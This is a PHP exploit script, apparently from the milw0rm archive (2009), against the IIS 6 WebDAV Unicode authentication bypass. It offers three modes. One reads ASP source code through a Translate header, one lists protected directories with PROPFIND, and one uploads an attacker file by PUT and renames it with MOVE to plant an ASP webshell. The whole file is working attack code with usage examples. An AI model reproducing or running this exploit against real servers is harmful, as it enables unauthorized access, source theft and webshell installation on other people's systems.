<?

print_r('
********  IIS 6 WEBDAV Exploit.By racle@tian6.com && Securiteweb.org  ********

       Usage: php '.$argv[0].' source/path/put host path
       Example: php '.$argv[0].' source www.tian6.com /blog/readme.asp
       Example2: php '.$argv[0].' path www.tian6.com /secret/
       Example3: php '.$argv[0].' put www.tian6.com /secret/ test.txt(evil code as test.txt)
****************************************************************
');

//verification du debut
if($argv[1]!="source"&&$argv[1]!="path"&&$argv[1]!="put"){echo "Choose a action,source or path or put.";die;}
else {$action=$argv[1];}

if(stristr($argv[2],"http://")){echo "No http:// in the host!";die;}
else{$host=$argv[2];}

if(stristr($argv[3],"/")==false){echo "Where is the / ?";die;}
else{$path=$argv[3];}


//sent
function sent($sock)
{
global  $host, $html;
$ock=fsockopen(gethostbyname($host),'80');
if (!$ock) {
echo 'No response from '.$host; die;
}
fputs($ock,$sock);
$html='';
while (!feof($ock)) {
$html.=fgets($ock);
}
fclose($ock);
}

if($action=="source"){
	$position=strrpos($path,"/");
    $path=substr_replace($path,"%c0%af/",$position,1);
	$sock="GET ".$path." HTTP/1.1\r\n";
    $sock.="Translate: f\r\n";
	$sock.="Host: ".$host."\r\n";
    $sock.="Connection:close\r\n\r\n";
	sent($sock);
	echo $html;
	die;
	}


if($action=="path"){
	$position=strrpos($path,"/");
    $path=substr_replace($path,"%c0%af",$position,0);
	$sock="PROPFIND  ".$path." HTTP/1.1\r\n";
	$sock.="Host: ".$host."\r\n";
    $sock.="Connection:close\r\n";
	$sock.='Content-Type: text/xml; charset="utf-8"'."\r\n";
	$sock.="Content-Length: 0\r\n\r\n";
    $sock.='<?xml version="1.0" encoding="utf-8"?><D:propfind xmlns:D="DAV:"><D:prop xmlns:R="http://www.foo.bar/boxschema/"><R:bigbox/><R:author/><R:DingALing/><R:Random/></D:prop></D:propfind>';
    sent($sock);
	$bur=explode("<a:href>",$html);
    foreach($bur as $line){$no=strpos($line,"<");$resultat.=substr($line,0,$no)."\n";}
    echo $resultat;
	die;
    }


if($action=="put"){
	echo "Remember,keep urfile in type txt!\r\n\r\n";
     $fp = fopen("test.txt", 'r');
	 if($fp!=false){
     while (false!==($char = fgets($fp))) {
     $fir1 .= $char;    # fix: hoahongtim Team: hvaonline.net
     }
     fclose($fp);
	$position=strrpos($path,"/");
    $path=substr_replace($path,"%c0%af",$position,0);
    $sock="PUT ".$path."test.txt HTTP/1.1\r\n";
	$sock.="Host: ".$host."\r\n";
	$sock.='Content-Type: text/xml; charset="utf-8"'."\r\n";
	$sock.="Connection:close\r\n";
	$sock.="Content-Length: ".strlen($fir1)."\r\n\r\n";
    $sock.="".$fir1."\r\n";
   	echo $sock; sent($sock);sleep(2);
	$sock="MOVE ".$path."test.txt HTTP/1.1\r\n";
    $sock.="Host: ".$host."\r\n";
    $sock.="Connection:close\r\n";
	$sock.="Destination: ".$path."racle.asp\n\n";
    sent($sock);
	echo "Be cool,man! Webshell is http://".$host.$path."racle.asp";
	die;}
	else{die;}
	}

# milw0rm.com [2009-05-22]